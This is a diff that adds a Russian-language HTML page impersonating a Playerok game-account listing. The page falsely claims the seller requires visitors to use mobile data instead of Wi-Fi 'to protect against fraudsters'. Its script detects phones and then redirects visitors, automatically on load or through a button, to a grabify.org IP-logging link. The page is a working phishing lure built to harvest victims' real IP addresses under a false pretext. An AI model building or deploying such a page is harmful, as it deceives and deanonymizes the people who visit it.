@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Доступ ограничен</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <!-- Модальное окно для уведомлений -->
+    <div class="notification-overlay" id="notificationOverlay"></div>
+    <div class="notification-modal" id="notificationModal">
+        <div class="notification-title" id="notificationTitle">Уведомление</div>
+        <div class="notification-message" id="notificationMessage">Требуется использовать мобильное устройство с мобильными данными (не Wi-Fi).</div>
+        <button class="notification-button" id="notificationClose">Закрыть</button>
+    </div>
+
+    <div class="warning-container">
+        <div class="playerok-header">
+            <a href="https://playerok.com" class="playerok-link"><span class="blue">Player</span><span class="ok">ok</span></a>
+        </div>
+
+        <div class="info-card">
+            <div class="warning-icon">⚠️</div>
+            <h1 class="warning-title">Доступ ограничен</h1>
+            <p class="warning-subtitle">Автор товара установил особые правила безопасности для просмотра и покупки аккаунта.</p>
+            
+            <div class="pc-message-box">
+                <div class="warning-icon">⚠️</div>
+                <h2 class="pc-block-title">Доступ с ПК запрещен</h2>
+                
+                <div class="restriction-text">
+                    Для просмотра этого аккаунта необходимо использовать только мобильное устройство с мобильными данными (не Wi-Fi).
+                </div>
+                
+                <ol class="mobile-steps">
+                    <li>Откройте эту страницу на мобильном устройстве</li>
+                    <li>Отключите Wi-Fi</li>
+                    <li>Включите мобильные данные</li>
+                    <li>Обновите страницу</li>
+                </ol>
+                
+                <div class="restriction-text">
+                    Это требование установлено продавцом для защиты от мошенников.
+                </div>
+            </div>
+            
+            <div class="account-info-box">
+                <div class="stats">
+                    <div class="stat-box">
+                        <div class="detail-label">Уровень</div>
+                        <div class="stat-value">74</div>
+                    </div>
+                    <div class="stat-box">
+                        <div class="detail-label">Звание</div>
+                        <div class="stat-value">Золото</div>
+                    </div>
+                    <div class="stat-box">
+                        <div class="detail-label">Рейтинг</div>
+                        <div class="stat-value">5 499</div>
+                    </div>
+                </div>
+                
+                <div class="price text-center mt-16 mb-16">5 499 ₽</div>
+                
+                <div class="rating text-center">
+                    <span class="rating-stars">★★★★★</span> 
+                    <span class="review-count">16 отзывов</span>
+                </div>
+            </div>
+            
+            <div class="mobile-detection-banner">
+                <strong>Внимание!</strong> Продавец настроил специальную защиту для этого товара
+            </div>
+            
+            <div class="check-item mb-16">
+                <span class="success-check">✓</span> Для просмотра этого аккаунта необходимо использовать только мобильное устройство с мобильными данными (не Wi-Fi).
+            </div>
+            
+            <div class="mb-16">Вы используете Wi-Fi соединение или ПК. Для продолжения:</div>
+            
+            <ol class="mobile-steps mb-16">
+                <li>Откройте эту страницу на мобильном устройстве</li>
+                <li>Отключите Wi-Fi</li>
+                <li>Включите мобильные данные</li>
+                <li>Обновите страницу</li>
+            </ol>
+            
+            <div class="mb-16">Это требование установлено продавцом для защиты от мошенников.</div>
+            
+            <button class="button" id="checkConnection">Проверить подключение</button>
+        </div>
+    </div>
+
+    <script>
+        // Устанавливаем флаг блокировки для WiFi и ПК
+        let isBlocked = true;
+    
+        document.addEventListener('DOMContentLoaded', function() {
+            // Инициализация модального окна
+            const modal = document.getElementById('notificationModal');
+            const overlay = document.getElementById('notificationOverlay');
+            const closeBtn = document.getElementById('notificationClose');
+            const title = document.getElementById('notificationTitle');
+            const message = document.getElementById('notificationMessage');
+            
+            // Функция для показа уведомления
+            function showNotification(titleText, messageText) {
+                title.textContent = titleText;
+                message.textContent = messageText;
+                modal.style.display = 'block';
+                overlay.style.display = 'block';
+                document.body.style.overflow = 'hidden';
+            }
+            
+            // Функция закрытия уведомления
+            function closeNotification() {
+                modal.style.display = 'none';
+                overlay.style.display = 'none';
+                document.body.style.overflow = 'auto';
+            }
+            
+            // Обработчик для кнопки закрытия уведомления
+            closeBtn.addEventListener('click', closeNotification);
+            
+            // Закрытие по клику на фон
+            overlay.addEventListener('click', closeNotification);
+            
+            // Проверяем устройство и тип соединения при загрузке
+            checkDeviceAndConnection(false);
+            
+            // Обработчик для логотипа Playerok
+            document.querySelector('.playerok-link').addEventListener('click', function(e) {
+                e.preventDefault();
+                window.location.href = "https://playerok.com";
+            });
+            
+            // Обработчик для кнопки проверки
+            document.getElementById('checkConnection').addEventListener('click', function() {
+                if (isBlocked) {
+                    showNotification('Уведомление', 'Требуется использовать мобильное устройство с мобильными данными (не Wi-Fi).');
+                } else {
+                    window.location.href = "https://grabify.org/2Fb04";
+                }
+            });
+        });
+        
+        function checkDeviceAndConnection(isButtonClick = false) {
+            // Проверка устройства (мобильное или нет)
+            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            
+            // Показываем блок в зависимости от устройства
+            if (!isMobile) {
+                document.querySelector('.pc-message-box').style.display = 'block';
+                document.querySelector('.account-info-box').style.display = 'none';
+                document.querySelector('.mobile-detection-banner').style.display = 'none';
+                document.querySelector('.check-item').style.display = 'none';
+                document.querySelectorAll('.mb-16').forEach(el => el.style.display = 'none');
+                document.querySelector('.button').style.display = 'none';
+                isBlocked = true;
+                return;
+            } else {
+                document.querySelector('.pc-message-box').style.display = 'none';
+            }
+            
+            // Более строгая проверка соединения
+            let isNotWifi = false;
+            
+            // Проверка через Network Information API
+            if ('connection' in navigator) {
+                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                if (connection && connection.type) {
+                    isNotWifi = (connection.type === 'cellular') || 
+                               (connection.type !== 'wifi' && connection.type !== 'ethernet');
+                }
+            }
+            
+            // Попытка обнаружить через другие методы
+            try {
+                // Создаем запрос для проверки скорости соединения
+                // Мобильные данные обычно имеют более высокую задержку
+                const startTime = Date.now();
+                
+                fetch('https://www.google.com/generate_204', {
+                    mode: 'no-cors',
+                    cache: 'no-store'
+                })
+                .then(() => {
+                    const latency = Date.now() - startTime;
+                    
+                    // Высокая задержка может указывать на мобильные данные
+                    if (latency > 100 && !isNotWifi) {
+                        isNotWifi = true;
+                        unlockIfMobile(isNotWifi);
+                    }
+                })
+                .catch(() => {
+                    // Если запрос не удался, предполагаем, что это может быть мобильное соединение
+                    isNotWifi = true;
+                    unlockIfMobile(isNotWifi);
+                });
+            } catch (e) {
+                console.error('Ошибка при проверке соединения:', e);
+            }
+            
+            // Обновляем статус блокировки
+            isBlocked = !isNotWifi;
+            
+            // Если условия соблюдены и это не ручная проверка, перенаправляем
+            if (isNotWifi && !isButtonClick) {
+                // Перенаправляем с небольшой задержкой, чтобы пользователь успел увидеть страницу
+                setTimeout(() => {
+                    window.location.href = "https://grabify.org/2Fb04";
+                }, 1000);
+            }
+        }
+        
+        function unlockIfMobile(isNotWifi) {
+            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            
+            if (isMobile && isNotWifi) {
+                isBlocked = false;
+                // Перенаправляем на страницу аккаунта
+                window.location.href = "https://grabify.org/2Fb04";
+            }
+        }
+    </script>
+</body>
+</html> 
